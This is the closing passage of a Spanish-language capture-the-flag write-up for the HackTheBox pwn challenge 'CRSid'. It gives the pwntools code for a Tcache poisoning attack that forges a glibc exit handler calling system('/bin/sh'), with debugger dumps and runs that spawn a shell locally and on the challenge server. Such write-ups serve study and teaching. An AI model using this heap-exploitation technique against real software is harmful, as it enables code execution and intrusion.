+</code></pre></div><p>Y todo parece correcto. Ahora tenemos que diseñar un <em>payload</em> para falsificar una función <em>exit_handler</em> (cifrando la dirección). Nótese que podemos usar <code>system</code> como función y <code>"/bin/sh"</code> como primer argumento:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">4</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">encrypt</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system, </span><span class="mtk1">key</span><span class="mtk1">))</span>  
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk8">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
+</code></pre></div><p>También, este es el vector de <code>users</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/20gx &stderr
+<span class="code-dark-blue">0x556e3bbd5040</span> &lt;<span class="code-dark-yellow">stderr</span>&gt;:        0x00007fb3cbdca680      0x0000000000000000  
+<span class="code-dark-blue">0x556e3bbd5050</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x556e3bbd5060</span>: 0x000055baf8a082f0      0x000055baf8a082a0
+<span class="code-dark-blue">0x556e3bbd5070</span>: 0x000055baf8a08390      0x000055baf8a083e0
+<span class="code-dark-blue">0x556e3bbd5080</span>: 0x000055baf8a08430      0x000055baf8a08480
+<span class="code-dark-blue">0x556e3bbd5090</span>: 0x000055baf8a084d0      0x00007fb3cbdcbbc0
+<span class="code-dark-blue">0x556e3bbd50a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x556e3bbd50b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x556e3bbd50c0</span>: 0x000055baf8a082a0      0x0000000000000000
+<span class="code-dark-blue">0x556e3bbd50d0</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>Finalmente, necesitamos escribir el <em>payload</em> en un <em>chunk</em> (sabemos la dirección exacta) y realizar otro ataque de Tcache <em>poisoning</em> para escribir esta dirección en la lista <code>__exit_funcs</code> (el índice <code>1</code> y el <code>12</code> del vector <code>users</code> apuntan al mismo <em>chunk</em>). Para desencadenar el ataque, simplemente tenemos que salir del programa:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">payload_pointer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2f0</span>
+
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">12</span><span class="mtk1">, p64(</span><span class="mtk8">obfuscate</span><span class="mtk1">(</span><span class="mtk1">__exit_funcs</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk1">heap_base_addr</span><span class="mtk1">)))</span>  
+
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">payload_pointer</span><span class="mtk1">))</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[#] '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'6'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 1022768  
+[<span class="code-green">+</span>] Heap base address: 0x55f7bb0f9000
+[<span class="code-green">+</span>] Glibc base address: 0x7fa8ff28a000
+[<span class="code-blue">*</span>] __exit_funcs address: 0x7fa8ff476818
+[<span class="code-blue">*</span>] Original exit handler address: 0x7fa8ff478bc0
+[<span class="code-blue">*</span>] _dl_fini address: 0x7fa8ff498350
+[<span class="code-blue">*</span>] Encrypted function: 0x30c6a2802fa23f4c
+[<span class="code-blue">*</span>] Encryption key: 0x1fa667cbae099481
+[<span class="code-blue">*</span>] Sanity check: 0x30c6a2802fa23f4c
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+crsid  glibc  solve.py
+</code></pre></div><h2 id="flag">Flag</h2><p>Y funciona bien en local. Vamos a probar en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 159.65.83.93:31667
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Opening connection to 159.65.83.93 on port 31667: Done  
+[<span class="code-green">+</span>] Heap base address: 0x55b95c204000
+[<span class="code-green">+</span>] Glibc base address: 0x7fb89c8eb000
+[<span class="code-blue">*</span>] __exit_funcs address: 0x7fb89cad7818
+[<span class="code-blue">*</span>] Original exit handler address: 0x7fb89cad9bc0
+[<span class="code-blue">*</span>] _dl_fini address: 0x7fb89caf9350
+[<span class="code-blue">*</span>] Encrypted function: 0x8ce2b8ac78fe460f
+[<span class="code-blue">*</span>] Encryption key: 0x2307b9c9c0f9af2f
+[<span class="code-blue">*</span>] Sanity check: 0x8ce2b8ac78fe460f
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+crsid
+flag.txt
+glibc
+<span class="code-red">$</span> cat flag.txt
+HTB{L1bC-2.34,S4f3_l1nKinG_4nD_O0B-g0_brrr}
+</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/CRSid/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#_safe-linking_"><em>Safe-linking</em></a></li><li><a href="#tcache-_poisoning_">Tcache <em>poisoning</em></a></li><li><a href="#variables-globales">Variables globales</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#explotación-del-tcache">Explotación del Tcache</a></li><li><a href="#_exit-handlers_"><em>Exit handlers</em></a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit="return window.open(&#34;https://tinyletter.com/7Rocky&#34;,&#34;popupwindow&#34;,&#34;scrollbars=yes,width=800,height=600&#34;),!0"><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
